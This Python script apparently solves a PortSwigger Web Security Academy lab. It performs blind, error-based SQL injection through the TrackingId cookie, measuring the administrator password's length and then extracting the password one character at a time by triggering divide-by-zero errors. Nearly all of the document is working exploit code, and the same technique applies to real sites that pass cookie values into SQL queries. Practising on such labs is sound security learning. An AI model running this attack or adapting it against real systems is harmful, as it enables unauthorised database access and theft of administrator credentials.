#!/usr/bin/python3

import re, requests,string
from pwn import *

url = 'https://0a9d00da03a58d42c01002ba003c00a6.web-security-academy.net/'
dict = string.ascii_lowercase + string.digits
flag = 'Internal Server Error'


a = requests.get(url)
trackingid = a.cookies.get('TrackingId')
session = a.cookies.get('session')

def test_password_length():
        for i in range(100):
            payload = str(trackingid)+"\'||(SELECT CASE WHEN LENGTH(password)>"+str(i)+" THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username=\'administrator\')||\'"
            cookies = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
            request = requests.get(url, cookies=cookies)
            output = request.text
            if re.search(flag,output):
                pass
            else:
                global password_length
                password_length = i
                break

def test_password():
    nbr = 0
    while password_length > nbr:
        for i in dict:
            password = ""
            payload = str(trackingid)+"\'||(SELECT CASE WHEN SUBSTR(password,"+str(nbr+1)+",1)=\'"+str(i)+"\' THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username=\'administrator\')||'"
            cookie = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
            a = requests.get(url, cookies=cookie)
            output = a.text
            if re.search(flag,output):
                nbr+=1
                password+=i
                print(password,end='')

pass_leng = log.progress('Working on password length')
test_password_length()
pass_leng.success('Password length is : ' + str(password_length))

password = log.progress('Working on the password')
print('[++] Password : ',end='')
test_password()



